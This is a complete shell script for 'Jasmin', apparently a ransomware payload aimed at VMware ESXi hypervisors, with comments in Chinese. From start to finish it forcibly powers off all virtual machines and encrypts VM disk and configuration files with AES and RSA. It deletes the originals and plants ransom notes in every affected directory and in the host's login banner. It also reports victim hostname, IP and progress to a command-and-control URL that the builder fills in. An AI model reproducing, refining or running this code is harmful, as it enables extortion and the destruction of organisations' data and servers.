#!/bin/sh
# Jasmin ESXi Payload — Auto-generated
# 纯 BusyBox sh + openssl，无 python/xxd 依赖，带加密进度条
# 关键：强制 C locale，否则 awk sprintf("%c",>=128) 会输出多字节UTF-8，损坏二进制密钥
export LC_ALL=C
export LANG=C
C2='{{C2_URL}}'
SECRET='{{HANDSHAKE}}'
EXTS='vmdk vmx vmem vmsn vmxf nvram vmsd'

# ── RSA公钥 ──
PUB_KEY='{{RSA_PUBLIC_KEY}}'

RANSOM_TXT='{{RANSOM_NOTE}}'

# ────────────────────────────────────────
# 工具函数
# ────────────────────────────────────────
log(){ echo "[jasmin] $*" >&2; }

has_cmd(){ command -v "$1" >/dev/null 2>&1; }

# hex → 原始二进制（用awk查表，BusyBox无xxd/strtonum也能跑）
hex2bin(){
    awk 'BEGIN{for(i=0;i<256;i++)t[sprintf("%02x",i)]=sprintf("%c",i)}
         {n=split($0,a,"");for(i=1;i<=n;i+=2)printf "%s",t[a[i] a[i+1]]}'
}

# 十进制 → 4字节小端二进制
dec2le(){
    awk -v n="$1" 'BEGIN{printf "%c%c%c%c",n%256,int(n/256)%256,int(n/65536)%256,int(n/16777216)%256}'
}

sha256_file(){
    # ESXi openssl 支持 -binary，直接输出32字节原始摘要
    openssl dgst -sha256 -binary "$1" 2>/dev/null
}

http_post(){
    # 返回非0表示上报失败(curl -f 在 HTTP>=400 时失败)，供调用方提示
    if has_cmd curl; then
        curl -s -f -X POST -d "$2" "$1" >/dev/null 2>&1
    elif has_cmd wget; then
        wget -q -O /dev/null --post-data="$2" "$1" 2>/dev/null
    else
        return 127
    fi
}

# 人类可读字节数
fmt_bytes(){
    awk -v b="$1" 'BEGIN{
        split("B KB MB GB TB PB",u," ");
        i=1; while(b>=1024 && i<6){b/=1024;i++}
        if(i==1) printf "%d%s",b,u[i]; else printf "%.2f%s",b,u[i];
    }'
}

# 判断文件是否为加密目标
is_target(){
    _e="${1##*.}"
    for _x in $EXTS; do
        [ "$_e" = "$_x" ] && return 0
    done
    return 1
}

# ────────────────────────────────────────
# 停止所有VM (确保VMDK不被锁定)
# ────────────────────────────────────────
stop_vms(){
    log "停止所有VM..."
    if has_cmd vim-cmd; then
        vim-cmd vmsvc/getallvms 2>/dev/null | awk 'NR>1{print $1}' | while read vmid; do
            [ -n "$vmid" ] || continue
            vim-cmd vmsvc/power.off "$vmid" 2>/dev/null
            log "  已停止 vmid=$vmid"
        done
    fi
    if has_cmd esxcli; then
        esxcli vm process list 2>/dev/null | grep 'World ID' | awk '{print $NF}' | while read wid; do
            [ -n "$wid" ] || continue
            esxcli vm process kill --type=soft --world-id="$wid" 2>/dev/null
        done
    fi
    sleep 2
}

# ────────────────────────────────────────
# 写RSA公钥到临时文件
# ────────────────────────────────────────
write_pubkey(){
    PF="/tmp/.jasmin_pub_$$"
    printf '%s\n' "$PUB_KEY" > "$PF"
    echo "$PF"
}

# ────────────────────────────────────────
# 加密单个文件
# 格式: [SHA256 32B][AES密文][RSA加密key块][4B key块长度(小端)]
# ────────────────────────────────────────
encrypt_file(){
    FILE="$1"
    PUBKEY="$2"
    [ -f "$FILE" ] || return 1
    [ -s "$FILE" ] || return 1
    case "$FILE" in *.jasmin) return 1;; esac

    KEY_HEX=$(openssl rand -hex 32 2>/dev/null) || return 1
    IV_HEX=$(openssl rand -hex 16 2>/dev/null)  || return 1

    ENC="${FILE}.jasmin"
    T_CT="/tmp/.jct_$$"
    T_KIV="/tmp/.jkiv_$$"
    T_EK="/tmp/.jek_$$"
    T_HASH="/tmp/.jhash_$$"

    # SHA256 原始文件（原始32字节）
    sha256_file "$FILE" > "$T_HASH" || { rm -f "$T_HASH"; return 1; }
    [ -s "$T_HASH" ] || { rm -f "$T_HASH"; return 1; }

    # AES-256-CBC 加密（openssl 自动 PKCS7 padding）
    openssl enc -aes-256-cbc -nosalt -in "$FILE" -out "$T_CT" \
        -K "$KEY_HEX" -iv "$IV_HEX" 2>/dev/null || { rm -f "$T_CT" "$T_HASH"; return 1; }

    # key(32B)+iv(16B) 原始二进制（awk hex2bin，替代缺失的 xxd）
    printf '%s%s' "$KEY_HEX" "$IV_HEX" | hex2bin > "$T_KIV" 2>/dev/null
    [ -s "$T_KIV" ] || { rm -f "$T_CT" "$T_KIV" "$T_HASH"; return 1; }

    # RSA-OAEP 加密 key+iv
    openssl pkeyutl -encrypt -pubin -inkey "$PUBKEY" \
        -in "$T_KIV" -out "$T_EK" \
        -pkeyopt rsa_padding_mode:oaep \
        -pkeyopt rsa_oaep_md:sha256 \
        -pkeyopt rsa_mgf1_md:sha256 2>/dev/null || {
        rm -f "$T_CT" "$T_KIV" "$T_EK" "$T_HASH"
        return 1
    }

    EK_LEN=$(wc -c < "$T_EK" 2>/dev/null)
    [ -n "$EK_LEN" ] || EK_LEN=256

    # 组装
    {
        cat "$T_HASH"
        cat "$T_CT"
        cat "$T_EK"
        dec2le "$EK_LEN"
    } > "$ENC" 2>/dev/null

    rm -f "$T_CT" "$T_KIV" "$T_EK" "$T_HASH"

    if [ -s "$ENC" ]; then
        rm -f "$FILE"
        return 0
    else
        rm -f "$ENC"
        return 1
    fi
}

# ────────────────────────────────────────
# 进度条: draw_bar 已处理数 总数 已处理字节 总字节 [当前文件]
# ────────────────────────────────────────
draw_bar(){
    N="$1"; T="$2"; CB="$3"; TB="$4"; CUR="$5"
    if [ "$T" -gt 0 ]; then
        PCT=$((N*100/T))
    else
        PCT=100
    fi
    [ "$PCT" -gt 100 ] && PCT=100

    # 28格进度条
    BAR=""
    I=0
    while [ "$I" -lt 28 ]; do
        if [ $((I*100/28)) -lt "$PCT" ]; then BAR="${BAR}#"; else BAR="${BAR}."; fi
        I=$((I+1))
    done
    if [ -z "$CUR" ]; then CUR="-"; fi
    # 路径截断为固定宽度，避免行长短变化留下残影
    CUR=$(printf '%s' "$CUR" | awk '{ if(length($0)>44) print "..." substr($0,length($0)-40); else print }')
    printf '\r  [%s] %3d%%  %d/%d  %s/%s  %-46s' \
        "$BAR" "$PCT" "$N" "$T" "$(fmt_bytes "$CB")" "$(fmt_bytes "$TB")" "$CUR" >&2
}

# ────────────────────────────────────────
# 投放勒索信
# ────────────────────────────────────────
drop_notes(){
    SID="$1"
    ND="$2"
    NOTE=$(printf '%s' "$RANSOM_TXT" | sed "s/{sid}/$SID/g")
    # 1) 数据存储顶层
    for DS in /vmfs/volumes/*; do
        [ -d "$DS" ] || continue
        printf '%s\n' "$NOTE" > "$DS/READ_ME_DECRYPT.txt" 2>/dev/null
    done
    # 2) 每个含有被加密文件的目录（去重后逐个投放）
    if [ -n "$ND" ] && [ -f "$ND" ]; then
        WROTE=0
        sort -u "$ND" > "$ND.uniq" 2>/dev/null || cp "$ND" "$ND.uniq"
        while IFS= read -r D; do
            [ -n "$D" ] || continue
            [ -d "$D" ] || continue
            printf '%s\n' "$NOTE" > "$D/READ_ME_DECRYPT.txt" 2>/dev/null && WROTE=$((WROTE+1))
        done < "$ND.uniq"
        rm -f "$ND.uniq"
        log "勒索信已投放到 $WROTE 个目录"
    fi
    printf '%s\n' "$NOTE" > /tmp/READ_ME_DECRYPT.txt 2>/dev/null
    if has_cmd esxcli; then
        esxcli system welcomemsg set -m "$(printf '%s' "$NOTE" | head -5)" 2>/dev/null
    fi
}

# ────────────────────────────────────────
# 回传C2 ($6=is_complete $7=total_count $8=total_size)
# ────────────────────────────────────────
beacon(){
    SID="$1"; COUNT="$2"; SIZE="$3"; TYPES="$4"; DETAIL="$5"
    DONE="${6:-1}"; TC="${7:-0}"; TS="${8:-0}"
    HOSTNAME=$(hostname 2>/dev/null || echo "esxi-host")
    OS_VER=$(uname -r 2>/dev/null || echo "ESXi")
    IP=$(esxcli network ip interface ipv4 get 2>/dev/null | awk '/vmk0/{print $2}' | head -1)
    [ -z "$IP" ] && IP=$(ifconfig vmk0 2>/dev/null | grep 'inet ' | awk '{print $2}')
    [ -z "$IP" ] && IP="0.0.0.0"
    DATE=$(date '+%d/%m/%Y, %A' 2>/dev/null)
    TIME_STR=$(date '+%H:%M:%S' 2>/dev/null)
    DATA="handshake=${SECRET}&machine_name=${HOSTNAME}&computer_user=root&os=ESXi%20${OS_VER}&date=${DATE}&time=${TIME_STR}&ip=${IP}&location=&systemid=${SID}&password=RSA_PROTECTED&encrypted_count=${COUNT}&encrypted_size=${SIZE}&encrypted_types=${TYPES}&encrypted_detail=${DETAIL}&is_complete=${DONE}&total_count=${TC}&total_size=${TS}"
    if ! http_post "$C2" "$DATA"; then
        log "!!! 上报失败: $C2"
        log "!!! 请检查回连地址是否可达、端口(本服务在 :8080)、握手密钥 SECRET 是否与后台一致"
    fi
}

# ────────────────────────────────────────
# 主流程
# ────────────────────────────────────────
main(){
    has_cmd openssl || { log "缺少openssl，无法运行"; exit 1; }

    SID="$(hostname)_$$_$(date +%s)"

    stop_vms

    PUBKEY=$(write_pubkey)

    # ── 阶段1: 预扫描统计目标文件总数（进度条分母） ──
    log "正在扫描目标文件..."
    TOTAL=0
    TOTAL_BYTES=0
    for DS in /vmfs/volumes/*; do
        [ -d "$DS" ] || continue
        CL="/tmp/.jcnt_$$"
        find "$DS" -type f 2>/dev/null > "$CL"
        while IFS= read -r F; do
            [ -n "$F" ] || continue
            if is_target "$F"; then
                TOTAL=$((TOTAL+1))
                SZ=$(wc -c < "$F" 2>/dev/null || echo 0)
                TOTAL_BYTES=$((TOTAL_BYTES+SZ))
            fi
        done < "$CL"
        rm -f "$CL"
    done
    log "发现 $TOTAL 个目标文件，合计 $(fmt_bytes "$TOTAL_BYTES")"

    COUNT=0
    SIZE=0
    TYPES=""
    FIRST=1
    LAST_BEACON=$(date +%s)
    NOTE_DIRS="/tmp/.jnotedirs_$$"
    : > "$NOTE_DIRS"

    if [ "$TOTAL" -gt 0 ]; then
        for DS in /vmfs/volumes/*; do
            [ -d "$DS" ] || continue
            # 先把文件清单落到临时文件，再普通while读取
            # （避免 find|while 子shell导致 COUNT/SIZE/TYPES 修改丢失）
            LIST="/tmp/.jlist_$$"
            find "$DS" -type f 2>/dev/null > "$LIST"
            while IFS= read -r F; do
                [ -n "$F" ] || continue
                is_target "$F" || continue
                EXT="${F##*.}"
                FSIZE=$(wc -c < "$F" 2>/dev/null || echo 0)

                if encrypt_file "$F" "$PUBKEY"; then
                    COUNT=$((COUNT+1))
                    SIZE=$((SIZE+FSIZE))
                    printf '%s\n' "${F%/*}" >> "$NOTE_DIRS"   # 记录目录，供勒索信投放
                    case ",$TYPES," in
                        *",$EXT,"*) ;;
                        *) if [ "$FIRST" = "1" ]; then TYPES="$EXT"; FIRST=0; else TYPES="${TYPES},${EXT}"; fi ;;
                    esac
                fi

                PROCESSED=$((COUNT))
                draw_bar "$PROCESSED" "$TOTAL" "$SIZE" "$TOTAL_BYTES" "$F"

                # 每8秒回传一次进度
                NOW=$(date +%s)
                if [ $((NOW-LAST_BEACON)) -ge 8 ]; then
                    LAST_BEACON=$NOW
                    beacon "$SID" "$COUNT" "$SIZE" "$TYPES" "{}" "0" "$TOTAL" "$TOTAL_BYTES"
                fi
            done < "$LIST"
            rm -f "$LIST"
        done
        printf '\n' >&2
    fi

    rm -f "$PUBKEY"

    log "加密完成: $COUNT/$TOTAL 个文件, $(fmt_bytes "$SIZE") / $(fmt_bytes "$TOTAL_BYTES")"

    drop_notes "$SID" "$NOTE_DIRS"
    rm -f "$NOTE_DIRS"
    beacon "$SID" "$COUNT" "$SIZE" "$TYPES" "{}" "1" "$TOTAL" "$TOTAL_BYTES"
}

main
